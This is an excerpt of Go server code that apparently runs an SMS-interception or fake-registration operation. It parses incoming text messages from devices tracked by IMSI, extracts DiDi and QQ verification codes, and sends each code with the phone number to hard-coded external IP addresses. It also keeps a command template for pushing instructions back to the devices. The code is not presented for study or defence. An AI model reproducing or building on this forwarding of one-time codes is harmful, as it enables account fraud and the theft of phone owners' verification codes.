...
func processDiDiRegister(msg string, user map[string]string, apid string) {
	...
	if nil != result {
		log.Println(result[0])
		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
		url := "http://112.74.183.43:9802/lsapi/channel/reportVerifyCode?cpid=8a6383bbb1364295b253514df591f707&telephone=" + mobile + "&smsContent=" + result[0]
		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	}
...
func processQQWithoutMoRegister(msg string, user map[string]string, apid string) {
	...
	if nil != result {
		log.Println(result[1])
		url := "http://121.201.67.189:9876/verifycode/api/getQQCodeNY.jsp?cid=c115&pid=qq_ny115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
		go send2Url(url)
	}
	go updateRelationSuccess(user, apid)
}
...
const DEFAULT_GETC = "<datas><cfg><durl></durl><vno>[matchMobile]</vno><stats>[matchStatus]</stats></cfg><da>[command-0][command-1][command-2]</da></datas>"
...
func receiverSms(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容
...
func updateUserMatchCount(imsi string) {
	...
	sql := `update imsi_users set matchCount = matchCount+1 where imsi =?`
	exec(dbConfig, sql, imsi)
}
func updateMobile(imsi string, mobile string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
	...
	sql := `update imsi_users set mobile = ? where imsi =?`
	exec(dbConfig, sql, mobile, imsi)
}
func insertUser(imsi string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
